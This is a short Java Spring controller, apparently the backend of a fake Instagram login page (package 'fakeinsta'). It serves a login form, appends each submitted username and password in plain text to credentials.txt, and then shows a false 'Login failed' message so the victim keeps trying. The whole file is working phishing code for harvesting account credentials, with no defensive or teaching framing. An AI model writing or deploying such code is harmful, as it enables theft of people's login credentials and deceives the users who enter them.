package com.fakepage.fakeinsta.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.io.FileWriter;
import java.io.IOException;

@Controller
public class LoginController {

    @GetMapping("/")
    public String showLoginPage() {
        return "login";
    }

    @PostMapping("/login")
    public String handleLogin(@RequestParam("username") String username,
                              @RequestParam("password") String password,
                              Model model) {

        try (FileWriter writer = new FileWriter("credentials.txt", true)) {
            writer.write("Username: " + username + ", Password: " + password + "\n");
        } catch (IOException e) {
            e.printStackTrace();
        }

        model.addAttribute("message", "Login failed. Please try again.");
        return "login";
    }
}
